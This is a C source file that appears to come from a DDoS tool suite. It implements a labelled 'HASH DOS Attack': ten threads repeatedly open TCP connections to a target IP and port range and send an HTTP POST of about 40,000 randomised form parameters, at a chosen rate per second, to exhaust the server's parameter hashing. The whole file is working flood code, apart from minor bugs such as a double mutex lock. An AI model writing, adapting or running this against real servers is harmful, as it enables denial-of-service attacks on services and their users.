#include "../header.h"
#include "../base/make_ipv4.h"
#include "../ddos/hash_dos.h"
#include "../base/subnet_mask.h"
#include "../base/time_check.h"

// session counting
unsigned long g_hash_dos_num_total;
unsigned long g_hash_dos_num_generated_in_sec;

//from main()
double g_g_hash_dos_elapsed_time;
char g_hash_dos_dest_ip[16];
char g_hash_dos_src_ip[16];
unsigned int g_hash_dos_src_mask;
unsigned int g_hash_dos_dest_mask;
unsigned int g_hash_dos_dest_port_start;
unsigned int g_hash_dos_dest_port_end;
unsigned int g_hash_dos_request_per_sec;
short hash_dos_timed_finisher;

//for masking next ip address
char g_hash_dos_now_src_ip[16];
char g_hash_dos_now_dest_ip[16];
unsigned int g_hash_dos_now_dest_port;

// thread
pthread_mutex_t g_hash_dos_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_cond_t g_hash_dos_cond;

int hash_dos_generated_count;

// time checking
struct timespec g_hash_dos_before_time;
struct timespec g_hash_dos_now_time;

char hash_dos_content[800001];
char hash_dos_randoms[10];
char hash_dos_method[800300];

void hash_dos_print_usage() {

	printf(
			"HASH DOS Attack Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
}

void* generate_hash_dos_request(void *data) {
	int thread_id = *((int*) data);

	while (1) {
		// start of critical section
		pthread_mutex_lock(&g_hash_dos_mutex);

		//get current resource
		generator(g_hash_dos_src_ip, g_hash_dos_dest_ip, g_hash_dos_src_mask,
				g_hash_dos_dest_mask, g_hash_dos_dest_port_start,
				g_hash_dos_dest_port_end, g_hash_dos_now_src_ip,
				g_hash_dos_now_dest_ip, &g_hash_dos_now_dest_port);

		//wait a second
		if (g_hash_dos_num_generated_in_sec >= g_hash_dos_request_per_sec) {
			pthread_cond_wait(&g_hash_dos_cond, &g_hash_dos_mutex);
		}

		//time check
		time_check(&g_hash_dos_mutex, &g_hash_dos_cond, &g_hash_dos_before_time,
				&g_hash_dos_now_time, &g_hash_dos_num_generated_in_sec);

		//make socket;
		int sock;
		if ((sock = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
			fprintf(stderr, "socket error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		struct sockaddr_in addr;
		addr.sin_family = AF_INET;
		addr.sin_port = htons(g_hash_dos_now_dest_port);
		addr.sin_addr.s_addr = inet_addr(g_hash_dos_dest_ip);

		//tcp connection
		if (connect(sock, (struct sockaddr*) &addr, sizeof(addr)) < 0) {
			fprintf(stderr, "connect error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		if (send(sock, hash_dos_method, strlen(hash_dos_method), 0) < 0) {
			fprintf(stderr, "send error %d %s\n", errno, strerror(errno));
			exit(1);
		}

		close(sock);
		printf("%ld\n",g_hash_dos_num_generated_in_sec);

		g_hash_dos_num_generated_in_sec++;
		g_hash_dos_num_total++;

		pthread_mutex_unlock(&g_hash_dos_mutex);
	}
	return 0;
}

void* hash_dos_time_check(void *data) {

	while (1) {
		pthread_mutex_lock(&g_hash_dos_mutex);
		time_check(&g_hash_dos_mutex, &g_hash_dos_cond, &g_hash_dos_before_time,
				&g_hash_dos_now_time, &g_hash_dos_num_generated_in_sec);
		pthread_mutex_lock(&g_hash_dos_mutex);
	}

}

void hash_dos_run(char *argv[]) {

	//argument check
	int argc = 0;
	while (argv[argc] != NULL) {
		argc++;
	}

	if (argc != 4) {
		hash_dos_print_usage();
		return;
	}

	split_ip_mask_port(argv, g_hash_dos_src_ip, g_hash_dos_dest_ip,
			&g_hash_dos_src_mask,
			&g_hash_dos_dest_mask,&g_hash_dos_dest_port_start,
			&g_hash_dos_dest_port_end);

	g_hash_dos_num_generated_in_sec = 0;
	g_hash_dos_num_total = 0;

	//prepare arbitary post method args
	int i;
	srand(time(NULL));
	char arg[21] = "arrrarrarrarrAaAa=1&";
	for (i = 0; i < 40000; i++) {
		arg[13] = rand() % 26 + 'A';
		arg[14] = rand() % 26 + 'a';
		arg[15] = rand() % 26 + 'A';
		arg[16] = rand() % 26 + 'a';
		strcat(hash_dos_content, arg);
	}
	sprintf(hash_dos_method,
			"POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: python-requests/2.22.0\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %d\r\n\r\n",
			g_hash_dos_src_ip, (int) sizeof(hash_dos_content));

	sprintf(hash_dos_method + strlen(hash_dos_method), "%s\r\n",
			hash_dos_content);

	memset(&g_hash_dos_before_time, 0, sizeof(struct timespec));
	memset(&g_hash_dos_now_time, 0, sizeof(struct timespec));
	g_hash_dos_request_per_sec = atoi(argv[3]);
	const int num_threads = 10;
	pthread_t threads[9999];
	int thread_ids[9999];

	printf("Sending hash_dos requests to %s per %d\n", g_hash_dos_dest_ip,
			g_hash_dos_request_per_sec);
	for (i = 0; i < num_threads; i++) {
		pthread_create(&threads[i], NULL, generate_hash_dos_request,
				(void*) &thread_ids[i]);
	}
	pthread_create(&threads[i], NULL, hash_dos_time_check, NULL);

	for (i = 0; i < num_threads; i++) {
		void *status;
		printf("called\n");
		pthread_join(threads[i], &status);
		printf("thread %d joined\n", i);
	}

	pthread_mutex_destroy(&g_hash_dos_mutex);
	printf("hash_dos flood Finished\nTotal %ld packets sent.\n",g_hash_dos_num_total);
	pthread_exit(NULL);

}

